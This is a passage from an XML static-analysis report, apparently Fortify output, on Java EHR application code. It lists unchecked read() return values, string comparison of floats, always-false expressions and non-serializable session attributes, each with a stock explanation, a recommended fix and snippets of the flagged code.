<LineStart>27</LineStart>
<Snippet>     */
	public NLRArtifactHeader findById(long nlrArtifactHeaderSid){
		return em.find(NLRArtifactHeader.class, nlrArtifactHeaderSid);
	}
	</Snippet>
<TargetFunction>javax.persistence.EntityManager.find()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="15">
                        <groupTitle>Unchecked Return Value</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method readObjectFromFile() in SerializationHelper.java ignores the value returned by read() on line 131, which could cause the program to overlook unexpected states and conditions.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>It is not uncommon for Java programmers to misunderstand read() and related methods that are part of many java.io classes. Most errors and unusual events in Java result in an exception being thrown. (This is one of the advantages that Java has over languages like C: Exceptions make it easier for programmers to think about what can go wrong.) But the stream and reader classes do not consider it unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested.

This behavior makes it important for programmers to examine the return value from read() and other IO methods to ensure that they receive the amount of data they expect.



Example: The following code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always exactly 1 kilobyte in size and therefore ignores the return value from read(). If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and handle it as though it belongs to the attacker.


FileInputStream fis;
byte[] byteArray = new byte[1024];
for (Iterator i=users.iterator(); i.hasNext();) {
    String userName = (String) i.next();
    String pFileName = PFILE_ROOT + "/" + userName;
    FileInputStream fis = new FileInputStream(pFileName);
    fis.read(byteArray); // the file is always 1k bytes
    fis.close();
    processPFile(userName, byteArray);
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>
  FileInputStream fis;
  byte[] byteArray = new byte[1024];
  for (Iterator i=users.iterator(); i.hasNext();) {
    String userName = (String) i.next();
    String pFileName = PFILE_ROOT + "/" + userName;
    fis = new FileInputStream(pFileName);
    int bRead = 0;
    while (bRead &lt; 1024) {
        int rd = fis.read(byteArray, bRead, 1024 - bRead);
        if (rd == -1) {
          throw new IOException("file is unusually small");
        }
        bRead += rd;
    }
    // could add check to see if file is too large here
    fis.close();
    processPFile(userName, byteArray);
  }


Note: Because the fix for this problem is relatively complicated, you might be tempted to use a simpler approach, such as checking the size of the file before you begin reading. Such an approach would render the application vulnerable to a file system race condition, whereby an attacker could replace a well-formed file with a malicious file between the file size check and the call to read data from the file.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Watch out for programmers who want to explain away this type of issue by saying "that can never happen because ...". Chances are good that they have developed their intuition about the way the system works by using their development workstation. If your software will eventually run under different operating systems, operating system versions, hardware configurations, or runtime environments, their intuition might not apply.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>15</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="22BDBE2F98A5F36EE893F54A01BF7F22" ruleID="EAD430B8-BF19-4940-89F3-F95272349A4C">
                            <Category>Unchecked Return Value</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The method readObjectFromFile() in SerializationHelper.java ignores the value returned by read() on line 131, which could cause the program to overlook unexpected states and conditions.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SerializationHelper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/SerializationHelper.java</FilePath>
<LineStart>131</LineStart>
<Snippet>
        byte [] l_objFileData = new byte [l_iFileSize];
        l_objBufferedInputStream.read(l_objFileData);
        l_objFileInputStream.close();
        l_objBufferedInputStream.close();</Snippet>
<TargetFunction>read()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4BB630B9FA68D8573FEB072855A32516" ruleID="F5479615-A5E9-4BC9-BDBF-6FAC2B062F80">
                            <Category>Unchecked Return Value</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The method getContentInChar() in FileUtil.java ignores the value returned by read() on line 128, which could cause the program to overlook unexpected states and conditions.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>128</LineStart>
<Snippet>            //Read file content and set it in array-of-char format.
            l_cFileContent = new char[(int) l_objFile.length()];
            l_objBufReader.read(l_cFileContent);
        }
        finally</Snippet>
<TargetFunction>read()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="885E77BC0507767F78334AE91F314803" ruleID="EAD430B8-BF19-4940-89F3-F95272349A4C">
                            <Category>Unchecked Return Value</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The method getContentInByte() in FileUtil.java ignores the value returned by read() on line 175, which could cause the program to overlook unexpected states and conditions.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>175</LineStart>
<Snippet>            //Read file content and set it in array-of-char format.
            l_bFileContent = new byte[(int) l_objFile.length()];
            l_objBufStream.read(l_bFileContent);
        }
        finally</Snippet>
<TargetFunction>read()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DF69171E0CCA9FF4BCA8373616D7CC77" ruleID="ED57A0C1-5039-43E7-B753-28128F786E8B">
                            <Category>Unchecked Return Value</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The method generatePageControlDCRInsertScript() in GenericTag.java ignores the value returned by mkdirs() on line 382, which could cause the program to overlook unexpected states and conditions.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>GenericTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/GenericTag.java</FilePath>
<LineStart>382</LineStart>
<Snippet>    	String l_sDirName = PAGE_CONTROL_DCR_PATH;//"C:\\Page Control DCRs";
    	File l_fileBaseDir = new File(l_sDirName);
    	l_fileBaseDir.mkdirs();

    	try {</Snippet>
<TargetFunction>mkdirs()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="885E77BC0507767F78334AE91F314802" ruleID="EAD430B8-BF19-4940-89F3-F95272349A4C">
                            <Category>Unchecked Return Value</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The method getContentInByte() in FileUtil.java ignores the value returned by read() on line 211, which could cause the program to overlook unexpected states and conditions.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>211</LineStart>
<Snippet>			//Read file content and set it in array-of-char format.
			l_bFileContent = new byte[(int) p_objFile.length()];
			l_objBufStream.read(l_bFileContent);
		}
		finally</Snippet>
<TargetFunction>read()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="12">
                        <groupTitle>Code Correctness: String Comparison of Float</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method addObjectiveCmplnc() in JSPGeneratorImpl.java at line 901 compares a floating-point value with a String object. This is very unreliable and should not be done.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>In order to compare a floating-point value to a String object, it must first be changed into a String object, typically via a function such as Double.toString(). Depending on the type and value of the floating-point variable, when converted to a String object, it could be "NaN", "Infinity", "-Infinity", have a certain amount of trailing decimal places containing zeroes, or may contain an exponent field. If converted to a hexadecimal String, the representation may differ greatly as well.

Example 1: The following compares a floating-point variable with a String.


  ...
  int initialNum = 1;
  ...
  String resultString = Double.valueOf(initialNum/10000.0).toString();
  if (s.equals("0.0001")){
    //do something
    ...
  }
  ...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>When comparing floating-point values, a comparison function such as java.lang.Double.compare() should be used. Also since precision may be critical, in order to prevent loss of precision, it may be better to use java.math.BigDecimal.

Example 2: The following fixes Example 1 by using java.math.BigDecimal.compareTo


  ...
  int initialNum = 1;
  ...
  BigDecimal result = new BigDecimal(Double.valueOf(initialNum/10000.0).toString());
  if (result.compareTo(new BigDecimal("0.0001")) == 0){
    //do something
  }
  ...


In this scenario, BigDecimal.compareTo() was used, as it considers two values the same even if their scale is different, unlike BigDecimal.equals().</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>12</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="C8DF86F47EBFE62896D5E323622422B9" ruleID="33A1271C-62E7-450E-A6F6-71C7EBFC1257">
                            <Category>Code Correctness: String Comparison of Float</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method addObjectiveCmplnc() in JSPGeneratorImpl.java at line 901 compares a floating-point value with a String object. This is very unreliable and should not be done.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>901</LineStart>
<Snippet>    		
    				//if only one record is present of value is equal to "0.0", no sequence number is used
    				if (this.getEhrObjectiveDetailList().size() == 1 || numOrderSqncNmbr.equals("0.0")) {			 
    					numOrderSqncNmbr = "";
    				} else { </Snippet>
<TargetFunction>java.lang.String.equals()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>898</LineStart>
<Snippet>    		    	//first retrieve double value of numerator sequence number and then convert it to string
    				Double numOrderSqncNmbrDbl = this.getEhrObjectiveDetail().getNumeratorOrderSqncNmbr();
    				String numOrderSqncNmbr = numOrderSqncNmbrDbl.toString();
    		
    				//if only one record is present of value is equal to "0.0", no sequence number is used</Snippet>
<TargetFunction>java.lang.Double.toString()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8075398B66B2368FAFA5E937C20D9338" ruleID="33A1271C-62E7-450E-A6F6-71C7EBFC1257">
                            <Category>Code Correctness: String Comparison of Float</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method addObjectiveCmplnc() in JSPGeneratorImpl.java at line 1013 compares a floating-point value with a String object. This is very unreliable and should not be done.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>1013</LineStart>
<Snippet>    				
    				//remove .0 for proper numerator numbering
    				if (denOrderSqncNmbr.endsWith(".0")) {				
    					denOrderSqncNmbr = denOrderSqncNmbr.substring(0,denOrderSqncNmbr.length()-2);
    				}</Snippet>
<TargetFunction>java.lang.String.endsWith()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>1002</LineStart>
<Snippet>            		//first retrieve double value of numerator sequence number and then convert it to string
    				Double denOrderSqncNmbrDbl = this.getEhrObjectiveDetail().getDenominatorOrderSqncNmbr();
    				String denOrderSqncNmbr = denOrderSqncNmbrDbl.toString();
    				
    				//if only one record is present of value is equal to "0.0", no sequence number is used</Snippet>
<TargetFunction>java.lang.Double.toString()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5DFEB78C09042E5F765FB66EFD0ACA19" ruleID="33A1271C-62E7-450E-A6F6-71C7EBFC1257">
                            <Category>Code Correctness: String Comparison of Float</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method addObjectiveCmplnc() in JSPGeneratorImpl.java at line 1005 compares a floating-point value with a String object. This is very unreliable and should not be done.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>1005</LineStart>
<Snippet>    				
    				//if only one record is present of value is equal to "0.0", no sequence number is used
    				if (this.getEhrObjectiveDetailList().size() == 1 || denOrderSqncNmbr.equals("0.0")) {			 
    					denOrderSqncNmbr = "";
    				} else { </Snippet>
<TargetFunction>java.lang.String.equals()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>1002</LineStart>
<Snippet>            		//first retrieve double value of numerator sequence number and then convert it to string
    				Double denOrderSqncNmbrDbl = this.getEhrObjectiveDetail().getDenominatorOrderSqncNmbr();
    				String denOrderSqncNmbr = denOrderSqncNmbrDbl.toString();
    				
    				//if only one record is present of value is equal to "0.0", no sequence number is used</Snippet>
<TargetFunction>java.lang.Double.toString()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6A1B0F8425BAD33E95E42BEB58A1734F" ruleID="33A1271C-62E7-450E-A6F6-71C7EBFC1257">
                            <Category>Code Correctness: String Comparison of Float</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method addExclusionCmplnc() in JSPGeneratorImpl.java at line 1206 compares a floating-point value with a String object. This is very unreliable and should not be done.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>1206</LineStart>
<Snippet>			// remove exclusion numbering if only a detail record is present
			if (this.getEhrObjectiveDetailList().size() == 1
					|| (exclOrderSqncNmbr.equals("0.0"))) {
				exclOrderSqncNmbr = "";
				// else add space to prefix sequence number and use it</Snippet>
<TargetFunction>java.lang.String.equals()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>1202</LineStart>
<Snippet>			Double dExclOrderSqncNmbr = this.getEhrObjectiveDetail().getExclOrderSqncNmbr();
			
			String exclOrderSqncNmbr = dExclOrderSqncNmbr.toString();
		
			// remove exclusion numbering if only a detail record is present</Snippet>
<TargetFunction>java.lang.Double.toString()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B851539CC863398832E2F4AA185BEB1C" ruleID="33A1271C-62E7-450E-A6F6-71C7EBFC1257">
                            <Category>Code Correctness: String Comparison of Float</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method addObjectiveCmplnc() in JSPGeneratorImpl.java at line 909 compares a floating-point value with a String object. This is very unreliable and should not be done.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>909</LineStart>
<Snippet>    				
    				//remove .0 for proper numerator numbering
    				if (numOrderSqncNmbr.endsWith(".0")) {
    					
    					numOrderSqncNmbr = numOrderSqncNmbr.substring(0,numOrderSqncNmbr.length()-2);</Snippet>
<TargetFunction>java.lang.String.endsWith()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>JSPGeneratorImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/JSPGeneratorImpl.java</FilePath>
<LineStart>898</LineStart>
<Snippet>    		    	//first retrieve double value of numerator sequence number and then convert it to string
    				Double numOrderSqncNmbrDbl = this.getEhrObjectiveDetail().getNumeratorOrderSqncNmbr();
    				String numOrderSqncNmbr = numOrderSqncNmbrDbl.toString();
    		
    				//if only one record is present of value is equal to "0.0", no sequence number is used</Snippet>
<TargetFunction>java.lang.Double.toString()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="12">
                        <groupTitle>Dead Code: Expression is Always false</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The expression at DbUtilImpl.java line 590 will always evaluate to false.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>This expression will always evaluate to false; the program could be rewritten in a simpler form. The nearby code may be present for debugging purposes, or it may not have been maintained along with the rest of the program. The expression may also be indicative of a bug earlier in the method.

Example 1: The following method never sets the variable secondCall after initializing it to false. (The variable firstCall is mistakenly used twice.)  The result is that the expression firstCall &amp;&amp; secondCall will always evaluate to false, so setUpDualCall() will never be invoked.


public void setUpCalls() {
  boolean firstCall = false;
  boolean secondCall = false;

  if (fCall &gt; 0) {
    setUpFCall();
    firstCall = true;
  }
  if (sCall &gt; 0) {
    setUpSCall();
    firstCall = true;
  }

  if (firstCall &amp;&amp; secondCall) {
    setUpDualCall();
  }
}


Example 2: The following method never sets the variable firstCall to true. (The variable firstCall is mistakenly set to false after the first conditional statement.)  The result is that the first part of the expression firstCall &amp;&amp; secondCall will always evaluate to false.


public void setUpCalls() {
  boolean firstCall = false;
  boolean secondCall = false;

  if (fCall &gt; 0) {
    setUpFCall();
    firstCall = false;
  }
  if (sCall &gt; 0) {
    setUpSCall();
    secondCall = true;
  }

  if (firstCall &amp;&amp; secondCall) {
    setUpForCall();
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>In general, you should repair or remove unused code. It causes additional complexity and maintenance burden without contributing to the functionality of the program.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>12</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="C1D3EFCA39D4B662341FEA7E007EA324" ruleID="0E2798F4-EFFE-4390-A6F5-FFBD9DC071B8">
                            <Category>Dead Code: Expression is Always false</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The expression at DbUtilImpl.java line 5606 will always evaluate to false.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>5606</LineStart>
<Snippet>
                    // if the query has field that does not map to a ?, skip to the next field.
                    if (p_sSequenceColumn != null &amp;&amp; p_sSequenceColumn.equals(l_sColName))
                    {
                        continue;</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7F42DCD75F41D3BA967BD754BD25B5AD" ruleID="0E2798F4-EFFE-4390-A6F5-FFBD9DC071B8">
                            <Category>Dead Code: Expression is Always false</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The expression at ECAMSInitializer.java line 343 will always evaluate to false.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ECAMSInitializer.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/ECAMSInitializer.java</FilePath>
<LineStart>343</LineStart>
<Snippet>                //END

                if (b_lstModuleIntializers != null) {
                    int b_iSize = b_lstModuleIntializers.size();
                    for (int i = 0; i &lt; b_iSize; ++i) {</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C3CE701844AD9229A28BB7DAE920E0BE" ruleID="0E2798F4-EFFE-4390-A6F5-FFBD9DC071B8">
                            <Category>Dead Code: Expression is Always false</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The expression at DbUtilImpl.java line 590 will always evaluate to false.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>590</LineStart>
<Snippet>        if (p_bIsSequenceIncrementRequired)
        {
            if (p_sSequenceName != null &amp;&amp; p_sSequenceColumn != null &amp;&amp;
                    !p_sSequenceName.equals(CommonConstants.EMPTY_STRING) &amp;&amp;
                    !p_sSequenceColumn.equals(CommonConstants.EMPTY_STRING))</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="506736EA4E39983FF5B9B49A5EE8FFF5" ruleID="0E2798F4-EFFE-4390-A6F5-FFBD9DC071B8">
                            <Category>Dead Code: Expression is Always false</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The expression at ECAMSInitializer.java line 66 will always evaluate to false.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ECAMSInitializer.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/ECAMSInitializer.java</FilePath>
<LineStart>66</LineStart>
<Snippet>        try {
            // if the initialization has been done, return.
            if(m_bLoaded) {
                return;
            } // if loaded</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C3CE701844AD9229A28BB7DAE920E0BF" ruleID="0E2798F4-EFFE-4390-A6F5-FFBD9DC071B8">
                            <Category>Dead Code: Expression is Always false</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The expression at DbUtilImpl.java line 598 will always evaluate to false.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>598</LineStart>
<Snippet>            else
            {
                if (p_sSequenceName != null &amp;&amp; p_sSequenceColumn == null ||
                        p_sSequenceName == null &amp;&amp; p_sSequenceColumn != null)
                {</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="11">
                        <groupTitle>J2EE Bad Practices: Non-Serializable Object Stored in Session</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method saveCurrentRecord() in LoginRequestHandler.java stores a non-serializable object as an HttpSession attribute, which can damage application reliability.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>A J2EE application can make use of multiple JVMs in order to improve application reliability and performance. In order to make the multiple JVMs appear as a single application to the end user, the J2EE container can replicate an HttpSession object across multiple JVMs so that if one JVM becomes unavailable another can step in and take its place without disrupting the flow of the application.

In order for session replication to work, the values the application stores as attributes in the session must implement the Serializable interface.

Example 1: The following class adds itself to the session, but because it is not serializable, the session can no longer be replicated.


public class DataGlob {
   String globName;
   String globValue;

   public void addToSession(HttpSession session) {
     session.setAttribute("glob", this);
   }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>In many cases, the easiest way to fix this problem is simply to have the offending object implement the Serializable interface.

Example 2: The code in Example 1 could be rewritten in the following way:


public class DataGlob implements java.io.Serializable {
   String globName;
   String globValue;

   public void addToSession(HttpSession session) {
     session.setAttribute("glob", this);
   }
}


Note that for complex objects, the transitive closure of the objects stored in the session must be serializable. If object A references object B and object A is stored in the session, then both A and B must implement Serializable.

While implementing the Serializable interface is often easy (since the interface does not force the class to define any methods), some types of objects will cause complications. Watch out for objects that hold references to external resources. For example, both streams and JNI are likely to cause complications.

Example 3: Use type checking to require serializable objects. Instead of this:


public static void addToSession(HttpServletRequest req,
                     String attrib, Object obj)
{
  HttpSession sess = req.getSession(true);
  sess.setAttribute(attrib, obj);
}


write this:


public static void addToSession(HttpServletRequest req,
                     String attrib, Serializable ser) {
  HttpSession sess = req.getSession(true);
  sess.setAttribute(attrib, ser);
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>11</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="62311CEB1014B500682B55AD876F9A2F" ruleID="7F7E0FDE-A69E-4F6F-91DB-F75A45091CC1">
                            <Category>J2EE Bad Practices: Non-Serializable Object Stored in Session</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method saveCurrentRecord1() in ProfileSelectRequestHandler.java stores a non-serializable object as an HttpSession attribute, which can damage application reliability.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ProfileSelectRequestHandler.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/web/action/ProfileSelectRequestHandler.java</FilePath>
<LineStart>666</LineStart>
<Snippet>               b_objSessionBinder.m_objUserDetails = l_objSecurityMgr.getUserDetails();

               l_objSession.setAttribute("UserLoggedIn", b_objSessionBinder);

               //first step of validation is moved to the security util class</Snippet>
<TargetFunction>FunctionCall: setAttribute()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9C04F2C1E273D5BFADF59CD5C0DCB3DF" ruleID="7F7E0FDE-A69E-4F6F-91DB-F75A45091CC1">
                            <Category>J2EE Bad Practices: Non-Serializable Object Stored in Session</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method prepareSecurityAccessManager() in LoginRequestHandler.java stores a non-serializable object as an HttpSession attribute, which can damage application reliability.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LoginRequestHandler.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/web/action/LoginRequestHandler.java</FilePath>
<LineStart>258</LineStart>
<Snippet>		    
		    userDetails = l_objSecurityMgr.getUserDetails();
		    l_objSession.setAttribute(CommonConstants.ATTR_SECURITY_MANAGER,l_objSecurityMgr);
		    p_objRequest.getSession().setAttribute(CommonConstants.ATTR_USER_DETAILS,l_objSecurityMgr.getUserDetails());
		    if (m_objLogger.getCurrentSeverityLevel() == Logger.SEVERITY_DEBUG) {</Snippet>
<TargetFunction>FunctionCall: setAttribute()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D094CBD0222EE216F683950E3EA7B55F" ruleID="7F7E0FDE-A69E-4F6F-91DB-F75A45091CC1">
                            <Category>J2EE Bad Practices: Non-Serializable Object Stored in Session</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method saveCurrentRecord1() in ProfileSelectRequestHandler.java stores a non-serializable object as an HttpSession attribute, which can damage application reliability.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ProfileSelectRequestHandler.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/web/action/ProfileSelectRequestHandler.java</FilePath>
<LineStart>489</LineStart>
<Snippet>            		   l_sUserID, l_sDomainNme);
               //set the user details in session for the first time.
               l_objSession.setAttribute(CommonConstants.ATTR_SECURITY_MANAGER,
                       l_objSecurityMgr);
               p_objRequest.getSession().setAttribute(CommonConstants.ATTR_USER_DETAILS,</Snippet>
<TargetFunction>FunctionCall: setAttribute()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7DF29AB050EA55BBF17005B113667755" ruleID="7F7E0FDE-A69E-4F6F-91DB-F75A45091CC1">
                            <Category>J2EE Bad Practices: Non-Serializable Object Stored in Session</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>The method saveCurrentRecord() in LoginRequestHandler.java stores a non-serializable object as an HttpSession attribute, which can damage application reliability.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LoginRequestHandler.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/web/action/LoginRequestHandler.java</FilePath>
<LineStart>188</LineStart>
<Snippet>                    b_objSessionBinder.m_objUserDetails = l_objSecurityMgr.getUserDetails();

